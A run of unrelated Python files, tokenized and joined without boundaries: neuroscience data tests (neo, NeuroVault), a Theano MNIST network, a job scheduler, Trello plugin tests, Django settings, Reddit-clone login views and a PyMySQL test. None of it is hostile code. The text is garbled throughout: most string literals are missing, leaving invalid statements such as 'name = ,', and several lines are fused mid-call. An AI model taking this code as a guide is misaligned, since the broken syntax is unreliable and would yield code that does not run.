\n 
self . assertEqual ( res , targ ) \n 
\n 
~~ def test__construct_subsegment_by_unit ( self ) : \n 
~~~ nb_seg = 3 \n 
nb_unit = 7 \n 
unit_with_sig = np . array ( [ 0 , 2 , 5 ] ) \n 
signal_types = [ , ] \n 
sig_len = 100 \n 
\n 
#recordingchannelgroups \n 
rcgs = [ RecordingChannelGroup ( name = , \n 
channel_indexes = unit_with_sig ) , \n 
RecordingChannelGroup ( name = , \n 
channel_indexes = unit_with_sig ) ] \n 
\n 
# Unit \n 
all_unit = [ ] \n 
for u in range ( nb_unit ) : \n 
~~~ un = Unit ( name = % u , channel_indexes = np . array ( [ u ] ) ) \n 
assert_neo_object_is_compliant ( un ) \n 
all_unit . append ( un ) \n 
\n 
~~ blk = Block ( ) \n 
blk . recordingchannelgroups = rcgs \n 
for s in range ( nb_seg ) : \n 
~~~ seg = Segment ( name = % s ) \n 
for j in range ( nb_unit ) : \n 
~~~ st = SpikeTrain ( [ 1 , 2 ] , units = , \n 
t_start = 0. , t_stop = 10 ) \n 
st . unit = all_unit [ j ] \n 
\n 
~~ for t in signal_types : \n 
~~~ anasigarr = AnalogSignalArray ( np . zeros ( ( sig_len , \n 
len ( unit_with_sig ) ) ) , \n 
units = , \n 
sampling_rate = 1000. * pq . Hz , \n 
channel_indexes = unit_with_sig ) \n 
seg . analogsignalarrays . append ( anasigarr ) \n 
\n 
~~ ~~ blk . create_many_to_one_relationship ( ) \n 
for unit in all_unit : \n 
~~~ assert_neo_object_is_compliant ( unit ) \n 
~~ for rcg in rcgs : \n 
~~~ assert_neo_object_is_compliant ( rcg ) \n 
~~ assert_neo_object_is_compliant ( blk ) \n 
\n 
# what you want \n 
newseg = seg . construct_subsegment_by_unit ( all_unit [ : 4 ] ) \n 
assert_neo_object_is_compliant ( newseg ) \n 
\n 
~~ def test_segment_take_spikes_by_unit ( self ) : \n 
~~~ result1 = self . seg1 . take_spikes_by_unit ( ) \n 
result21 = self . seg1 . take_spikes_by_unit ( [ self . unit1 ] ) \n 
result22 = self . seg1 . take_spikes_by_unit ( [ self . unit2 ] ) \n 
\n 
self . assertEqual ( result1 , [ ] ) \n 
\n 
assert_same_sub_schema ( result21 , [ self . spikes1a [ 0 ] ] ) \n 
assert_same_sub_schema ( result22 , [ self . spikes1a [ 1 ] ] ) \n 
\n 
~~ def test_segment_take_spiketrains_by_unit ( self ) : \n 
~~~ result1 = self . seg1 . take_spiketrains_by_unit ( ) \n 
result21 = self . seg1 . take_spiketrains_by_unit ( [ self . unit1 ] ) \n 
result22 = self . seg1 . take_spiketrains_by_unit ( [ self . unit2 ] ) \n 
\n 
self . assertEqual ( result1 , [ ] ) \n 
\n 
assert_same_sub_schema ( result21 , [ self . trains1a [ 0 ] ] ) \n 
assert_same_sub_schema ( result22 , [ self . trains1a [ 1 ] ] ) \n 
\n 
~~ def test_segment_take_analogsignal_by_unit ( self ) : \n 
~~~ result1 = self . seg1 . take_analogsignal_by_unit ( ) \n 
result21 = self . seg1 . take_analogsignal_by_unit ( [ self . unit1 ] ) \n 
result22 = self . seg1 . take_analogsignal_by_unit ( [ self . unit2 ] ) \n 
\n 
self . assertEqual ( result1 , [ ] ) \n 
\n 
assert_same_sub_schema ( result21 , [ self . sigs1a [ 0 ] ] ) \n 
assert_same_sub_schema ( result22 , [ self . sigs1a [ 1 ] ] ) \n 
\n 
~~ def test_segment_take_analogsignal_by_channelindex ( self ) : \n 
~~~ ind1 = self . unit1 . channel_indexes [ 0 ] \n 
ind2 = self . unit2 . channel_indexes [ 0 ] \n 
result1 = self . seg1 . take_analogsignal_by_channelindex ( ) \n 
result21 = self . seg1 . take_analogsignal_by_channelindex ( [ ind1 ] ) \n 
result22 = self . seg1 . take_analogsignal_by_channelindex ( [ ind2 ] ) \n 
\n 
self . assertEqual ( result1 , [ ] ) \n 
\n 
assert_same_sub_schema ( result21 , [ self . sigs1a [ 0 ] ] ) \n 
assert_same_sub_schema ( result22 , [ self . sigs1a [ 1 ] ] ) \n 
\n 
~~ def test_seg_take_slice_of_analogsignalarray_by_unit ( self ) : \n 
~~~ seg = self . seg1 \n 
result1 = seg . take_slice_of_analogsignalarray_by_unit ( ) \n 
result21 = seg . take_slice_of_analogsignalarray_by_unit ( [ self . unit1 ] ) \n 
result23 = seg . take_slice_of_analogsignalarray_by_unit ( [ self . unit3 ] ) \n 
\n 
self . assertEqual ( result1 , [ ] ) \n 
\n 
targ1 = [ self . sigarrs1a [ 0 ] [ : , np . array ( [ True ] ) ] , \n 
self . sigarrs1a [ 1 ] [ : , np . array ( [ False ] ) ] ] \n 
targ3 = [ self . sigarrs1a [ 0 ] [ : , np . array ( [ False ] ) ] , \n 
self . sigarrs1a [ 1 ] [ : , np . array ( [ True ] ) ] ] \n 
assert_same_sub_schema ( result21 , targ1 ) \n 
assert_same_sub_schema ( result23 , targ3 ) \n 
\n 
~~ def test_seg_take_slice_of_analogsignalarray_by_channelindex ( self ) : \n 
~~~ seg = self . seg1 \n 
ind1 = self . unit1 . channel_indexes [ 0 ] \n 
ind3 = self . unit3 . channel_indexes [ 0 ] \n 
result1 = seg . take_slice_of_analogsignalarray_by_channelindex ( ) \n 
result21 = seg . take_slice_of_analogsignalarray_by_channelindex ( [ ind1 ] ) \n 
result23 = seg . take_slice_of_analogsignalarray_by_channelindex ( [ ind3 ] ) \n 
\n 
self . assertEqual ( result1 , [ ] ) \n 
\n 
targ1 = [ self . sigarrs1a [ 0 ] [ : , np . array ( [ True ] ) ] , \n 
self . sigarrs1a [ 1 ] [ : , np . array ( [ False ] ) ] ] \n 
targ3 = [ self . sigarrs1a [ 0 ] [ : , np . array ( [ False ] ) ] , \n 
self . sigarrs1a [ 1 ] [ : , np . array ( [ True ] ) ] ] \n 
assert_same_sub_schema ( result21 , targ1 ) \n 
assert_same_sub_schema ( result23 , targ3 ) \n 
\n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ unittest . main ( ) \n 
# -*- coding: utf-8 -*- \n 
~~ """\nTests of neo.io.neuroscopeio\n""" \n 
\n 
# needed for python 3 compatibility \n 
from __future__ import absolute_import , division \n 
\n 
try : \n 
~~~ import unittest2 as unittest \n 
~~ except ImportError : \n 
~~~ import unittest \n 
\n 
~~ from neo . io import NeuroScopeIO \n 
from neo . test . iotest . common_io_test import BaseTestIO \n 
\n 
\n 
class TestNeuroScopeIO ( BaseTestIO , unittest . TestCase , ) : \n 
~~~ ioclass = NeuroScopeIO \n 
files_to_test = [ ] \n 
files_to_download = [ , \n 
, \n 
] \n 
\n 
\n 
~~ if __name__ == "__main__" : \n 
~~~ unittest . main ( ) \n 
~~ from django . http import HttpResponseRedirect \n 
from neurovault . apps . statmaps . utils import HttpRedirectException \n 
\n 
class CollectionRedirectMiddleware : \n 
~~~ def process_exception ( self , request , exception ) : \n 
~~~ if isinstance ( exception , HttpRedirectException ) : \n 
~~~ return HttpResponseRedirect ( exception . args [ 0 ] ) \n 
# -*- coding: utf-8 -*- \n 
~~ ~~ ~~ from __future__ import unicode_literals \n 
\n 
from django . db import models , migrations \n 
import json , os \n 
dir = os . path . abspath ( os . path . dirname ( __file__ ) ) \n 
\n 
def populate_cogatlas ( apps , schema_editor ) : \n 
~~~ CognitiveAtlasTask = apps . get_model ( "statmaps" , "CognitiveAtlasTask" ) \n 
CognitiveAtlasContrast = apps . get_model ( "statmaps" , "CognitiveAtlasContrast" ) \n 
json_content = open ( os . path . join ( dir , "cognitiveatlas_tasks.json" ) ) . read ( ) \n 
json_content = json_content . decode ( "utf-8" ) . replace ( , ) \n 
data = json . loads ( json_content ) \n 
for item in data : \n 
~~~ task = CognitiveAtlasTask ( name = item [ "name" ] , cog_atlas_id = item [ "id" ] ) \n 
task . save ( ) \n 
for contrast in item [ "contrasts" ] : \n 
~~~ contrast = CognitiveAtlasContrast ( name = contrast [ "conname" ] , cog_atlas_id = contrast [ "conid" contrast . save ( ) \n 
\n 
~~ ~~ ~~ class Migration ( migrations . Migration ) : \n 
\n 
~~~ dependencies = [ \n 
( , ) , \n 
] \n 
\n 
operations = [ \n 
migrations . RunPython ( populate_cogatlas ) , \n 
] \n 
# -*- coding: utf-8 -*- \n 
~~ from __future__ import unicode_literals \n 
\n 
from django . db import models , migrations \n 
\n 
\n 
class Migration ( migrations . Migration ) : \n 
\n 
~~~ dependencies = [ \n 
( , ) , \n 
( , ) \n 
] \n 
\n 
operations = [ \n 
] \n 
~~ import os . path \n 
\n 
from django . contrib . auth . models import User \n 
from django . core . files . uploadedfile import SimpleUploadedFile \n 
from django . test import TestCase , Client \n 
\n 
from neurovault . apps . statmaps . forms import NIDMResultsForm \n 
from neurovault . apps . statmaps . models import Collection , StatisticMap , Comparison \n 
from neurovault . apps . statmaps . utils import count_processing_comparisons , count_existing_comparisons \n 
from . utils import clearDB \n 
\n 
\n 
class Test_Counter ( TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ print "\\n\\n### TESTING COUNTER ###" \n 
self . test_path = os . path . abspath ( os . path . dirname ( __file__ ) ) \n 
self . user = User . objects . create ( username = ) \n 
self . client = Client ( ) \n 
self . client . login ( username = self . user ) \n 
self . Collection1 = Collection ( name = , owner = self . user , \n 
DOI = ) \n 
self . Collection1 . save ( ) \n 
self . Collection2 = Collection ( name = , owner = self . user , \n 
DOI = ) \n 
self . Collection2 . save ( ) \n 
self . Collection3 = Collection ( name = , owner = self . user , \n 
DOI = ) \n 
self . Collection3 . save ( ) \n 
\n 
\n 
~~ def tearDown ( self ) : \n 
~~~ clearDB ( ) \n 
\n 
~~ def test_statmaps_processing ( self ) : \n 
\n 
# The counter is the count of the number of images with the field "transform" set to None \n 
# The field is populated with the file when image comparisons are done, meaning that if there is only one # image in the database (case below) we cannot calculate comparisons, and the "transform" field remains none # This is currently the only way that we can test the counter, which will be "1" in this case ~~~ print "\\nTesting Counter - added statistic maps ###" \n 
Image1 = StatisticMap ( name = , collection = self . Collection1 , file = , Image1 . file = SimpleUploadedFile ( , file ( os . path . join ( self . test_path , Image1 . save ( ) \n 
images_processing = count_processing_comparisons ( Image1 . pk ) \n 
print "%s images processing [should be 0]" % ( images_processing ) \n 
self . assertEqual ( images_processing , 0 ) \n 
\n 
# When we add an image, the comparison will be calculated with image1, and both images transform fields will be populated # the counter will be set to 0.  Celery runs in synchronous mode when testing (meaning that jobs are run locally, one # after the other, instead of being sent to worker nodes) so there is no way to test submitting a batch of async # jobs and watching the "images still processing" counter go from N to 0. There is also no way of arbitrarily # setting an image transform field to "None" because on save, all image comparisons are automatically re-calcualted         Image2 = StatisticMap ( name = , collection = self . Collection2 , file = , map_type Image2 . file = SimpleUploadedFile ( , file ( os . path . join ( self . test_path , Image2 . save ( ) \n 
images_processing = count_processing_comparisons ( Image1 . pk ) \n 
print "%s images processing [should be 0]" % ( images_processing ) \n 
self . assertEqual ( images_processing , 0 ) \n 
\n 
# We should have 2 images total, so 1 comparison \n 
total_comparisons = count_existing_comparisons ( Image1 . pk ) \n 
self . assertEqual ( total_comparisons , 1 ) \n 
\n 
# Adding a group of NIDM result images \n 
~~ def test_adding_nidm ( self ) : \n 
~~~ Image2 = StatisticMap ( name = , collection = self . Collection1 , file = , map_type Image2 . file = SimpleUploadedFile ( , file ( os . path . join ( self . test_path , Image2 . save ( ) \n 
\n 
zip_file = open ( os . path . join ( self . test_path , ) , ) \n 
post_dict = { \n 
: , \n 
: . format ( ) , \n 
: self . Collection2 . pk } \n 
fname = os . path . basename ( os . path . join ( self . test_path , ) ) file_dict = { : SimpleUploadedFile ( fname , zip_file . read ( ) ) } \n 
zip_file . close ( ) \n 
form = NIDMResultsForm ( post_dict , file_dict ) \n 
# Transforms should be generated synchronously \n 
nidm = form . save ( ) \n 
print "\\nTesting Counter - added nidm result ###" \n 
\n 
# We should have 2 images total, so 1 comparison \n 
total_comparisons = count_existing_comparisons ( Image2 . pk ) \n 
self . assertEqual ( total_comparisons , 1 ) \n 
\n 
\n 
Image2ss = StatisticMap ( name = , collection = self . Collection3 , file = Image2ss . file = SimpleUploadedFile ( , file ( os . path . join ( self . test_path , Image2ss . save ( ) \n 
total_comparisons = count_existing_comparisons ( Image2ss . pk ) \n 
self . assertEqual ( total_comparisons , 0 ) \n 
\n 
# Make sure comparisons were calculated \n 
number_comparisons = len ( Comparison . objects . all ( ) ) \n 
print "\\n %s comparisons exist after adding NIDM `[should not be 0]" % ( number_comparisons ) \n 
self . assertEqual ( number_comparisons > 0 , True ) \n 
~~ ~~ """\ndeletes collection folders for collections that were deleted. after this update, folders should be deleted\nautomatically when the collection is deleted so this is simply to delete folders created before this update\n""" \n 
\n 
from neurovault . settings import PRIVATE_MEDIA_ROOT \n 
import os \n 
import os . path \n 
from neurovault . apps . statmaps . models import * \n 
\n 
def delOldCollDir ( ) : \n 
~~~ collDir = os . path . join ( PRIVATE_MEDIA_ROOT , ) \n 
for folder in os . listdir ( collDir ) : \n 
~~~ if not Collection . objects . filter ( pk = folder ) : \n 
~~~ os . rmdir ( os . path . join ( collDir , folder ) ) \n 
\n 
~~ ~~ ~~ delOldCollDir ( ) import theano \n 
from theano import tensor as T \n 
from theano . sandbox . rng_mrg import MRG_RandomStreams as RandomStreams \n 
import numpy as np \n 
from load import mnist \n 
\n 
srng = RandomStreams ( ) \n 
\n 
def floatX ( X ) : \n 
~~~ return np . asarray ( X , dtype = theano . config . floatX ) \n 
\n 
~~ def init_weights ( shape ) : \n 
~~~ return theano . shared ( floatX ( np . random . randn ( * shape ) * 0.01 ) ) \n 
\n 
~~ def rectify ( X ) : \n 
~~~ return T . maximum ( X , 0. ) \n 
\n 
~~ def softmax ( X ) : \n 
~~~ e_x = T . exp ( X - X . max ( axis = 1 ) . dimshuffle ( 0 , ) ) \n 
return e_x / e_x . sum ( axis = 1 ) . dimshuffle ( 0 , ) \n 
\n 
~~ def RMSprop ( cost , params , lr = 0.001 , rho = 0.9 , epsilon = 1e-6 ) : \n 
~~~ grads = T . grad ( cost = cost , wrt = params ) \n 
updates = [ ] \n 
for p , g in zip ( params , grads ) : \n 
~~~ acc = theano . shared ( p . get_value ( ) * 0. ) \n 
acc_new = rho * acc + ( 1 - rho ) * g ** 2 \n 
gradient_scaling = T . sqrt ( acc_new + epsilon ) \n 
g = g / gradient_scaling \n 
updates . append ( ( acc , acc_new ) ) \n 
updates . append ( ( p , p - lr * g ) ) \n 
~~ return updates \n 
\n 
~~ def dropout ( X , p = 0. ) : \n 
~~~ if p > 0 : \n 
~~~ retain_prob = 1 - p \n 
X *= srng . binomial ( X . shape , p = retain_prob , dtype = theano . config . floatX ) \n 
X /= retain_prob \n 
~~ return X \n 
\n 
~~ def model ( X , w_h , w_h2 , w_o , p_drop_input , p_drop_hidden ) : \n 
~~~ X = dropout ( X , p_drop_input ) \n 
h = rectify ( T . dot ( X , w_h ) ) \n 
\n 
h = dropout ( h , p_drop_hidden ) \n 
h2 = rectify ( T . dot ( h , w_h2 ) ) \n 
\n 
h2 = dropout ( h2 , p_drop_hidden ) \n 
py_x = softmax ( T . dot ( h2 , w_o ) ) \n 
return h , h2 , py_x \n 
\n 
~~ trX , teX , trY , teY = mnist ( onehot = True ) \n 
\n 
X = T . fmatrix ( ) \n 
Y = T . fmatrix ( ) \n 
\n 
w_h = init_weights ( ( 784 , 625 ) ) \n 
w_h2 = init_weights ( ( 625 , 625 ) ) \n 
w_o = init_weights ( ( 625 , 10 ) ) \n 
\n 
noise_h , noise_h2 , noise_py_x = model ( X , w_h , w_h2 , w_o , 0.2 , 0.5 ) \n 
h , h2 , py_x = model ( X , w_h , w_h2 , w_o , 0. , 0. ) \n 
y_x = T . argmax ( py_x , axis = 1 ) \n 
\n 
cost = T . mean ( T . nnet . categorical_crossentropy ( noise_py_x , Y ) ) \n 
params = [ w_h , w_h2 , w_o ] \n 
updates = RMSprop ( cost , params , lr = 0.001 ) \n 
\n 
train = theano . function ( inputs = [ X , Y ] , outputs = cost , updates = updates , allow_input_downcast = True ) \n 
predict = theano . function ( inputs = [ X ] , outputs = y_x , allow_input_downcast = True ) \n 
\n 
for i in range ( 100 ) : \n 
~~~ for start , end in zip ( range ( 0 , len ( trX ) , 128 ) , range ( 128 , len ( trX ) , 128 ) ) : \n 
~~~ cost = train ( trX [ start : end ] , trY [ start : end ] ) \n 
~~ print np . mean ( np . argmax ( teY , axis = 1 ) == predict ( teX ) ) \n 
\n 
~~ """Represents PostgreSQL datastore.""" \n 
\n 
from ndscheduler import settings \n 
from ndscheduler . core . datastore . providers import base \n 
\n 
\n 
class DatastorePostgresql ( base . DatastoreBase ) : \n 
\n 
~~~ @ classmethod \n 
def get_db_url ( cls ) : \n 
~~~ """\n        DATABASE_CONFIG_DICT = {\n            \'user\': \'myuser\',\n            \'password\': \'password\',\n            \'hostname\': \'mydb.domain.com\',\n            \'port\': 5432,\n            \'database\': \'mydatabase\',\n            \'sslmode\': \'disable\'\n        }\n\n        :return: database url\n        :rtype: str\n        """ \n 
\n 
return % ( \n 
settings . DATABASE_CONFIG_DICT [ ] , \n 
settings . DATABASE_CONFIG_DICT [ ] , \n 
settings . DATABASE_CONFIG_DICT [ ] , \n 
settings . DATABASE_CONFIG_DICT [ ] , \n 
settings . DATABASE_CONFIG_DICT [ ] , \n 
settings . DATABASE_CONFIG_DICT [ ] ) \n 
~~ ~~ """A job to send a HTTP (GET or DELETE) periodically.""" \n 
\n 
import logging \n 
import requests \n 
\n 
from ndscheduler import job \n 
\n 
logger = logging . getLogger ( __name__ ) \n 
\n 
\n 
class CurlJob ( job . JobBase ) : \n 
~~~ TIMEOUT = 10 \n 
\n 
@ classmethod \n 
def meta_info ( cls ) : \n 
~~~ return { \n 
: % ( cls . __module__ , cls . __name__ ) , \n 
: , \n 
: [ \n 
# url \n 
{ : , : } , \n 
# Request Type \n 
{ : , : \n 
} , \n 
\n 
] , \n 
: ( \'["http://localhost:8888/api/v1/jobs", "GET"]\' \n 
\'["http://localhost:8888/api/v1/jobs/ba12e", "DELETE"]\' ) \n 
} \n 
\n 
~~ def run ( self , url , request_type , * args , ** kwargs ) : \n 
~~~ print ( % ( url ) ) \n 
\n 
session = requests . Session ( ) \n 
result = session . request ( request_type , \n 
url , \n 
timeout = self . TIMEOUT , \n 
headers = None , \n 
data = None ) \n 
print ( result . text ) \n 
\n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ job = CurlJob . create_test_instance ( ) \n 
job . run ( ) \n 
~~ import unittest \n 
from . mock import MagicMock , Mock \n 
from . util import TrelloElementMock , CommandMock , OperationMock \n 
\n 
from operations import * \n 
\n 
class BaseOperationTests ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . base_operation , self . trello_element = OperationMock . create ( BaseOperation ) \n 
self . class_mock , self . instance_mock = OperationMock . instance ( self . base_operation ) \n 
self . collection = TrelloElementMock . collection ( ) \n 
self . base_operation . collection = TrelloCollection ( self . collection ) \n 
\n 
~~ def test_items_sets_the_collection ( self ) : \n 
~~~ self . base_operation . set_collection = MagicMock ( ) \n 
self . base_operation . items ( ) \n 
self . base_operation . set_collection . assert_called_with ( ) \n 
\n 
~~ def test_items_returns_every_name_from_the_collection_with_the_added_options ( self ) : \n 
~~~ self . base_operation . set_collection = MagicMock ( ) \n 
self . assertEqual ( self . base_operation . items ( ) , [ ".." , "Open in Browser" , "Create Base" , "first" \n 
~~ def test_callback_uses_find_to_instantiate_the_operation_if_the_index_is_in_the_collection ( self ) ~~~ self . base_operation . callback ( 3 ) \n 
self . class_mock . assert_called_with ( self . collection [ 0 ] , self . base_operation ) \n 
\n 
~~ def test_callback_calls_execute_on_the_operation ( self ) : \n 
~~~ self . base_operation . callback ( 3 ) \n 
self . instance_mock . execute . assert_called_with ( self . base_operation . command ) \n 
\n 
~~ def test_callback_doesnt_call_find_if_the_index_is_bigger_than_the_collection_length ( self ) : \n 
~~~ big_index = 55 \n 
self . base_operation . callback ( big_index ) \n 
assert not self . class_mock . called \n 
\n 
~~ def test_callback_calls_execute_on_the_previous_operation_if_index_is_0 ( self ) : \n 
~~~ self . base_operation . callback ( 0 ) \n 
self . base_operation . previous_operation . execute . assert_called_with ( ) \n 
\n 
~~ def test_callback_calls_the_input_method_on_the_command_with_deferred_add_as_callback_if_index_is_1 ~~~ self . base_operation . command . input = MagicMock ( ) \n 
self . base_operation . callback ( 2 ) \n 
self . base_operation . command . input . assert_called_with ( "Name" , self . base_operation . deferred_add \n 
~~ def test_base_add_calls_add_with_the_text_and_cleans_the_cache_for_the_element ( self ) : \n 
~~~ text = "Text" \n 
self . base_operation . add = MagicMock ( ) \n 
self . base_operation . trello_element . reload = MagicMock ( ) \n 
self . base_operation . base_add ( text ) \n 
self . base_operation . add . assert_called_with ( text ) \n 
self . trello_element . reload . assert_called_with ( ) \n 
\n 
~~ def test_base_add_calls_add_and_execute_if_renavigate_is_true ( self ) : \n 
~~~ text = "Text" \n 
self . base_operation . command . renavigate = True \n 
self . base_operation . execute = MagicMock ( ) \n 
self . base_operation . base_add ( text ) \n 
self . base_operation . execute . assert_called_with ( ) \n 
\n 
~~ ~~ class BoardOperationTests ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . operation , self . trello_element = OperationMock . create ( BoardOperation ) \n 
self . operation . collection = TrelloCollection ( TrelloElementMock . collection ( ) ) \n 
\n 
~~ def test_items_returns_every_name_from_the_collection_without_goback ( self ) : \n 
~~~ self . operation . set_collection = MagicMock ( ) \n 
self . assertEqual ( self . operation . items ( ) , [ "Open in Browser" , "Create Board" , "first" , "second" \n 
~~ def test_trello_element_property ( self ) : \n 
~~~ self . assertEqual ( self . operation . trello_element_property ( ) , "boards" ) \n 
\n 
~~ def test_callback_calls_execute_command_with_the_index ( self ) : \n 
~~~ self . operation . execute_command = MagicMock ( ) \n 
self . operation . callback ( 5 ) \n 
self . operation . execute_command . assert_called_with ( 3 ) \n 
\n 
~~ def test_callback_calls_the_input_method_on_the_command_with_deferred_add_as_callback_if_index_is_1 ~~~ self . operation . command . input = MagicMock ( ) \n 
self . operation . callback ( 1 ) \n 
self . operation . command . input . assert_called_with ( "Name" , self . operation . deferred_add ) \n 
\n 
~~ def test_next_operation_class ( self ) : \n 
~~~ self . assertEqual ( self . operation . next_operation_class ( ) , ListOperation ) \n 
\n 
~~ def test_add_creates_a_board_with_the_text ( self ) : \n 
~~~ text = "Some Text" \n 
self . trello_element . add_board = MagicMock ( ) \n 
self . operation . add ( text ) \n 
self . trello_element . add_board . assert_called_with ( text ) \n 
\n 
~~ ~~ class ListOperationTests ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . operation , self . trello_element = OperationMock . create ( ListOperation ) \n 
\n 
~~ def test_trello_element_property ( self ) : \n 
~~~ self . assertEqual ( self . operation . trello_element_property ( ) , "lists" ) \n 
\n 
~~ def test_next_operation_class ( self ) : \n 
~~~ self . assertEqual ( self . operation . next_operation_class ( ) , CardOperation ) \n 
\n 
~~ def test_add_creates_a_list_with_the_text ( self ) : \n 
~~~ text = "Some Text" \n 
self . trello_element . add_list = MagicMock ( ) \n 
self . operation . add ( text ) \n 
self . trello_element . add_list . assert_called_with ( text ) \n 
\n 
~~ ~~ class CardOperationTests ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . operation , self . trello_element = OperationMock . create ( CardOperation ) \n 
\n 
~~ def test_items_returns_every_name_from_the_collection_with_custom_actions ( self ) : \n 
~~~ self . operation . set_collection = MagicMock ( ) \n 
self . operation . collection = TrelloCollection ( TrelloElementMock . collection ( ) ) \n 
self . assertEqual ( self . operation . items ( ) , [ , , \n 
~~ def test_trello_element_property ( self ) : \n 
~~~ self . assertEqual ( self . operation . trello_element_property ( ) , "cards" ) \n 
\n 
~~ def test_next_operation_class ( self ) : \n 
~~~ self . assertEqual ( self . operation . next_operation_class ( ) , CardOptions ) \n 
\n 
~~ def test_add_creates_a_card_with_the_text_and_description ( self ) : \n 
~~~ name = "Some Text" \n 
desc = "Some Desc" \n 
self . trello_element . add_card = MagicMock ( ) \n 
self . operation . add ( name , desc ) \n 
self . trello_element . add_card . assert_called_with ( name , desc ) \n 
\n 
~~ def test_split_card_contents_returns_the_name_and_description_splitted_by_new_lines ( self ) : \n 
~~~ content = "Name!!\\n\\nDescription\\nYeah!" \n 
name , desc = self . operation . split_card_contents ( content ) \n 
self . assertEqual ( name , "Name!!" ) \n 
self . assertEqual ( desc , "Description\\nYeah!" ) \n 
\n 
\n 
~~ ~~ if __name__ == : \n 
~~~ unittest . main ( ) # -*- coding: utf-8 -*- \n 
~~ \n 
\n 
from . common import * # noqa \n 
\n 
# DEBUG \n 
# ------------------------------------------------------------------------------ \n 
DEBUG = env . bool ( , default = True ) \n 
TEMPLATES [ 0 ] [ ] [ ] = DEBUG \n 
\n 
# SECRET CONFIGURATION \n 
# ------------------------------------------------------------------------------ \n 
# See: https://docs.djangoproject.com/en/dev/ref/settings/#secret-key \n 
# Note: This key only used for development and testing. \n 
SECRET_KEY = env ( "DJANGO_SECRET_KEY" , default = ) \n 
\n 
# Mail settings \n 
# ------------------------------------------------------------------------------ \n 
EMAIL_HOST = \n 
EMAIL_PORT = 1025 \n 
EMAIL_BACKEND = env ( , \n 
default = ) \n 
\n 
# CACHING \n 
# ------------------------------------------------------------------------------ \n 
CACHES = { \n 
: { \n 
: , \n 
: \n 
} \n 
} \n 
\n 
# django-debug-toolbar \n 
# ------------------------------------------------------------------------------ \n 
MIDDLEWARE_CLASSES += ( , ) \n 
INSTALLED_APPS += ( , ) \n 
\n 
INTERNAL_IPS = ( , , ) \n 
\n 
DEBUG_TOOLBAR_CONFIG = { \n 
: [ \n 
, \n 
] , \n 
: True , \n 
} \n 
\n 
\n 
# TESTING \n 
# ------------------------------------------------------------------------------ \n 
TEST_RUNNER = \n 
# Your local stuff: Below this line define 3rd party library settings \n 
from django . contrib import messages \n 
from django . contrib . auth import logout , login , authenticate \n 
from django . contrib . auth . decorators import login_required \n 
from django . contrib . auth . models import User \n 
from django . http import HttpResponseBadRequest , Http404 \n 
from django . shortcuts import render , redirect , get_object_or_404 \n 
\n 
from reddit . forms import UserForm , ProfileForm \n 
from reddit . utils . helpers import post_only \n 
from users . models import RedditUser \n 
\n 
\n 
def user_profile ( request , username ) : \n 
~~~ user = get_object_or_404 ( User , username = username ) \n 
profile = RedditUser . objects . get ( user = user ) \n 
\n 
return render ( request , , { : profile } ) \n 
\n 
\n 
~~ @ login_required \n 
def edit_profile ( request ) : \n 
~~~ user = RedditUser . objects . get ( user = request . user ) \n 
\n 
if request . method == : \n 
~~~ profile_form = ProfileForm ( instance = user ) \n 
\n 
~~ elif request . method == : \n 
~~~ profile_form = ProfileForm ( request . POST , instance = user ) \n 
if profile_form . is_valid ( ) : \n 
~~~ profile = profile_form . save ( commit = False ) \n 
profile . update_profile_data ( ) \n 
profile . save ( ) \n 
messages . success ( request , "Profile settings saved" ) \n 
~~ ~~ else : \n 
~~~ raise Http404 \n 
\n 
~~ return render ( request , , { : profile_form } ) \n 
\n 
\n 
~~ def user_login ( request ) : \n 
~~~ """\n    Pretty straighforward user authentication using password and username\n    supplied in the POST request.\n    """ \n 
\n 
if request . user . is_authenticated ( ) : \n 
~~~ messages . warning ( request , "You are already logged in." ) \n 
return render ( request , ) \n 
\n 
~~ if request . method == "POST" : \n 
~~~ username = request . POST . get ( ) \n 
password = request . POST . get ( ) \n 
if not username or not password : \n 
~~~ return HttpResponseBadRequest ( ) \n 
\n 
~~ user = authenticate ( username = username , \n 
password = password ) \n 
\n 
if user : \n 
~~~ if user . is_active : \n 
~~~ login ( request , user ) \n 
redirect_url = request . POST . get ( ) or \n 
return redirect ( redirect_url ) \n 
~~ else : \n 
~~~ return render ( request , , \n 
{ : "Account disabled" } ) \n 
~~ ~~ else : \n 
~~~ return render ( request , , \n 
{ : "Wrong username or password." } ) \n 
\n 
~~ ~~ return render ( request , ) \n 
\n 
\n 
~~ @ post_only \n 
def user_logout ( request ) : \n 
~~~ """\n    Log out user if one is logged in and redirect them to frontpage.\n    """ \n 
\n 
if request . user . is_authenticated ( ) : \n 
~~~ redirect_page = request . POST . get ( , ) \n 
logout ( request ) \n 
messages . success ( request , ) \n 
return redirect ( redirect_page ) \n 
~~ return redirect ( ) \n 
\n 
\n 
~~ def register ( request ) : \n 
~~~ """\n    Handles user registration using UserForm from forms.py\n    Creates new User and new RedditUser models if appropriate data\n    has been supplied.\n\n    If account has been created user is redirected to login page.\n    """ \n 
user_form = UserForm ( ) \n 
if request . user . is_authenticated ( ) : \n 
~~~ messages . warning ( request , \n 
) \n 
return render ( request , , { : user_form } ) \n 
\n 
~~ if request . method == "POST" : \n 
~~~ user_form = UserForm ( request . POST ) \n 
\n 
if user_form . is_valid ( ) : \n 
~~~ user = user_form . save ( ) \n 
user . set_password ( user . password ) \n 
user . save ( ) \n 
reddit_user = RedditUser ( ) \n 
reddit_user . user = user \n 
reddit_user . save ( ) \n 
user = authenticate ( username = request . POST [ ] , \n 
password = request . POST [ ] ) \n 
login ( request , user ) \n 
return redirect ( ) \n 
\n 
~~ ~~ return render ( request , , { : user_form } ) \n 
~~ import unittest2 \n 
\n 
from pymysql . tests import base \n 
from pymysql import util \n 
\n 
\n 
class TestNextset ( base . PyMySQLTestCase ) : \n 
\n 
~~~ def setUp ( self ) : \n 
~~~ super ( TestNextset , self ) . setUp ( ) \n 
self . con = self . connections [ 0 ] \n 
\n 
~~ def test_nextset ( self ) : \n 
~~~ cur = self . con . cursor ( ) \n 
cur . execute ( "SELECT 1; SELECT 2;" ) \n 
self . assertEqual ( [ ( 1 , ) ] , list ( cur ) ) \n 
\n 
r = cur . nextset ( ) \n 
self . assertTrue ( r ) \n 
\n 
